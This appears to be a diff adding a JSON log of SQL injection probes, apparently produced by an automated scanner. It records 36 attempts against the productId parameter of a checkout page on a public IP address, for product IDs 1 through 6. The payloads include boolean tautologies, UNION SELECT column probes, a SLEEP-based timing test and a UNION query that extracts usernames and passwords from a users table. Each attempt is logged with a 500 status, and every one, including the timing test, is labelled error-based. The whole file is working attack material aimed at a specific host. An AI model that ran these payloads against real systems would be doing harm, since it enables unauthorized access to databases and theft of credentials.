@@ -1,0 +1,290 @@
+[
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "response_length": 189,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "response_length": 196,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "response_length": 197,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "1' AND SLEEP(5)--",
+    "type": "Error-based",
+    "response_length": 192,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "response_length": 185,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=2",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "response_length": 246,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "response_length": 189,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "response_length": 196,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "response_length": 197,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "1' AND SLEEP(5)--",
+    "type": "Error-based",
+    "response_length": 192,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "response_length": 185,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=5",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "response_length": 246,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "response_length": 189,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "response_length": 196,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "response_length": 197,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "1' AND SLEEP(5)--",
+    "type": "Error-based",
+    "response_length": 192,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "response_length": 185,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=3",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "response_length": 246,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "response_length": 189,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "response_length": 196,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "response_length": 197,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "1' AND SLEEP(5)--",
+    "type": "Error-based",
+    "response_length": 192,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "response_length": 185,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=6",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "response_length": 246,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "response_length": 189,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "response_length": 196,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "response_length": 197,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "1' AND SLEEP(5)--",
+    "type": "Error-based",
+    "response_length": 192,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "response_length": 185,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=4",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "response_length": 246,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' OR '1'='1",
+    "type": "Error-based",
+    "response_length": 189,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' UNION SELECT NULL--",
+    "type": "Error-based",
+    "response_length": 196,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' UNION SELECT 1,2,3--",
+    "type": "Error-based",
+    "response_length": 197,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "1' AND SLEEP(5)--",
+    "type": "Error-based",
+    "response_length": 192,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' OR 1=1--",
+    "type": "Error-based",
+    "response_length": 185,
+    "status_code": 500
+  },
+  {
+    "url": "http://52.247.225.51/checkout?productId=1",
+    "param": "productId",
+    "payload": "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
+    "type": "Error-based",
+    "response_length": 246,
+    "status_code": 500
+  }
+]
